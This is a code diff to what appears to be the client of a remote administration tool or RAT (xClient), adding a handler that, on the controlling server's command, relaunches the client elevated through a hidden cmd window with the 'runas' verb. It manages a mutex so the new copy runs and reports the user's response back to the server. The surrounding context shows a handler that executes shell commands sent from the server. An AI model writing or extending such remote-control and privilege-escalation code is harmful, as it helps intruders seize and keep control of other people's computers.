@@ -6,6 +6,8 @@ using System.Linq;
 using System.Net.NetworkInformation;
 using System.Windows.Forms;
 using Microsoft.Win32;
+using xClient.Config;
+using xClient.Core.Data;
 using xClient.Core.Extensions;
 using xClient.Core.Helper;
 using xClient.Core.Networking;
@@ -438,6 +440,38 @@ namespace xClient.Core.Commands
             }
         }
 
+        public static void HandleDoAskElevate(Packets.ServerPackets.DoAskElevate command, Client client)
+        {
+            if (WindowsAccountHelper.GetAccountType() != "Admin")
+            {
+                ProcessStartInfo processStartInfo = new ProcessStartInfo
+                {
+                    FileName = "cmd",
+                    Verb = "runas",
+                    Arguments = "/k START \"\" \"" + ClientData.CurrentPath + "\" & EXIT",
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = true
+                };
+
+                MutexHelper.CloseMutex();  // close the mutex so our new process will run
+                try
+                {
+                    Process.Start(processStartInfo);
+                }
+                catch
+                {
+                    new Packets.ClientPackets.SetStatus("User refused the elevation request.").Execute(client);
+                    MutexHelper.CreateMutex(Settings.MUTEX);  // re-grab the mutex
+                    return;
+                }
+                Program.ConnectClient.Exit();
+            }
+            else
+            {
+                new Packets.ClientPackets.SetStatus("Process already elevated.").Execute(client);
+            }
+        }
+        
         public static void HandleDoShellExecute(Packets.ServerPackets.DoShellExecute command, Client client)
         {
             string input = command.Command;
